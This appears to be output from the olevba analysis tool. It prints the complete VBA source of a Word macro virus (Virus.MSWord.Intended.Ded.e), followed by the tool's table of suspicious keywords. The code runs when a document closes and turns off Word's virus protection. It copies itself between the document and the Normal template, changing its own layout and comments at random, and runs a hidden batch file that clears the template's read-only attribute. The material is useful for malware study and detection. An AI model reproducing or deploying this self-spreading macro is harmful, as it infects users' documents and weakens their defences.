olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ded.e-1447823fc27a1f1d8f6f2aac5c20730c38b4c1a5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ded.e-1447823fc27a1f1d8f6f2aac5c20730c38b4c1a5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
              Private Sub Document_Close()
'98,60931
  On Error _
GoTo skam

         Options.VirusProtection = False
'9,797382
       SWLABS99
'35,34726
skam:
'6,091624
       End Sub
'78,39953
             Private Sub _
SWLABS99()

      If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

       For i _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

   d = _
NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

            If Len(d) > 0 And Not _
d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) _
- 1, 2) = " _"

       i = i _
+ 1

         d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

              Wend
'68,08194
    d = _
e(d)

       ActiveDocument. _
VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

               End If
'27,52955
       Next _
i

       ActiveDocument.SaveAs _
AddToRecentFiles:=False

           Else
'80,42672
 If Not _
NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

       f _
(NormalTemplate.FullName)

   For _
i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

  d = ActiveDocument.VBProject. _
VBComponents(1).CodeModule.Lines(i, 1)

         If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

        While Mid(d, Len(d) - _
1, 2) = " _"

   i _
= i + 1

     d = Left(d, _
Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

              Wend
'97,9531
         d = e(d)
'45,09423
               NormalTemplate.VBProject.VBComponents(1). _
CodeModule.InsertLines i * 2, d

            End If
'50,81665
           Next _
i

               NormalTemplate.Save
'75,85744
     End If
'7,36342
     End _
If

           End Sub
'69,33535
       Private Function e(aString) As _
String

        For _
i = 1 To Len(aString) - 1

          While Mid(aString, i, 2) = " "
'76,00104
            aString _
= Left(aString, i) & Right(aString, Len(aString) - i - 1)

     Wend
'56,5222
         If _
Mid(aString, i, 1) = "." Then

  If Not _
Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

      If _
Not Mid(aString, i + 1, 1) = Chr$(34) Then

         e = Left(aString, _
i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

      For j = _
1 To Int(15 * Rnd)

 e = " " & e
'38,75368
             Next j
'39,61983
       Exit Function
'37,49508
        End _
If

              End If
'99,07359
        Else
'62,9924
        If Mid(aString, i, 1) _
= " " And Int(3 * Rnd) = 1 And i > 1 Then

        If Not _
Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

         e = _
Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

               For j = 1 To Int(15 * Rnd)
'22,60666
     e _
= " " & e

      Next j
'72,40078
             Exit Function
'96,42301
               End _
If

         End If
'75,60766
      End _
If

           Next i
'80,47636
              e = aString & Chr$(13) & "'" & (100 * Rnd)
'5,263227
             Count = _
Int(15 * Rnd)

            For j = _
1 To Count

         e _
= " " & e

 Next j
'85,64014
         End Function
'25,12414
             Private Sub f(fName)
'74,76321
 If GetAttr(fName) And vbReadOnly Then
'9,341228
               Open Dir(fName) _
& ".bat" For Append As #1

            Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

  Print #1, "del " & _
Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

          Close #1
'82,54276
             shellResult = Shell(Dir(fName) & ".bat", vbHide)
'5,501533
       End If
'79,24049
           End Sub
'10,75434
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

